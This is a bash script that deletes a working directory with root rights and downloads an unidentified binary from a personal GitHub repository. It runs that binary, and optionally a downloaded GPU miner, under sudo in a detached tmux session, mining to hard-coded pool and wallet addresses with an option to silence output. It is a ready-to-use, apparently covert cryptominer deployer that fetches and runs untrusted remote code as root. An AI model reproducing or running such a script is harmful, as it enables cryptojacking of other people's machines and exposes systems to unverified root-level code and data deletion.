
#!/usr/bin/env bash
set -Eeuo pipefail

WORKDIR="/home/amazingness"
SESSION="amazingness"

CPU=false
GPU=false
SILENT=false

if [[ $# -eq 0 ]]; then
    CPU=true
    GPU=true
else
    for arg in "$@"; do
        case "$arg" in
            --cpu|-c) CPU=true ;;
            --gpu|-g) GPU=true ;;
            -s|--silent) SILENT=true ;;
            *) echo "Unknown argument: $arg"; exit 1 ;;
        esac
    done
fi

for cmd in wget chmod mkdir rm sudo tmux; do
    command -v "$cmd" >/dev/null 2>&1 || {
        echo "Missing dependency: $cmd"
        exit 1
    }
done

if $GPU; then
    command -v tar >/dev/null 2>&1 || exit 1
fi

sudo -v

if tmux has-session -t "$SESSION" 2>/dev/null; then
    echo "Session already exists: $SESSION"
    exit 1
fi

sudo rm -rf -- "$WORKDIR"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

if $CPU; then
    wget -q -O prog https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog
    [[ -s prog ]] || exit 1
    chmod +x prog

    cat > cpu.sh <<'EOF'
#!/usr/bin/env bash
cd /home/amazingness
sudo ./prog -o pool.hashvault.pro:443 -u 424trk6WMSt8vygKnjq3EfFw3C3bifZikKqS9vnG71QGGaoaLSTRxgSZeJboHFoiAkKHeprp4QUqz9FEf6p5AzcN5ex3iYL -p x -k --tls
EOF
    chmod +x cpu.sh
fi

if $GPU; then
    wget -q -O peakminer-2.20.2.tar.gz https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-20-2/peakminer-2.20.2.tar.gz
    [[ -s peakminer-2.20.2.tar.gz ]] || exit 1
    tar -xf peakminer-2.20.2.tar.gz
    [[ -f peakminer ]] || exit 1
    chmod +x peakminer

    cat > gpu.sh <<'EOF'
#!/usr/bin/env bash
cd /home/amazingness
sudo ./peakminer --coin pearl -o stratum+tcp://prl.kryptex.network:7048 -u prl1pgagd966xfjz0udj3fdlyx6x3afrxv9layzvl93pdm6nedfph2z0s5w744v
EOF
    chmod +x gpu.sh
fi

if $SILENT; then
    REDIRECT=">/dev/null 2>&1"
else
    REDIRECT=""
fi

if $CPU && $GPU; then
    tmux new-session -d -s "$SESSION" -c "$WORKDIR" -n CPU
    tmux send-keys -t "$SESSION:CPU" "./cpu.sh $REDIRECT" Enter
    tmux new-window -d -t "$SESSION" -n GPU -c "$WORKDIR"
    tmux send-keys -t "$SESSION:GPU" "./gpu.sh $REDIRECT" Enter
elif $CPU; then
    tmux new-session -d -s "$SESSION" -c "$WORKDIR" -n CPU
    tmux send-keys -t "$SESSION:CPU" "./cpu.sh $REDIRECT" Enter
else
    tmux new-session -d -s "$SESSION" -c "$WORKDIR" -n GPU
    tmux send-keys -t "$SESSION:GPU" "./gpu.sh $REDIRECT" Enter
fi

echo "running"
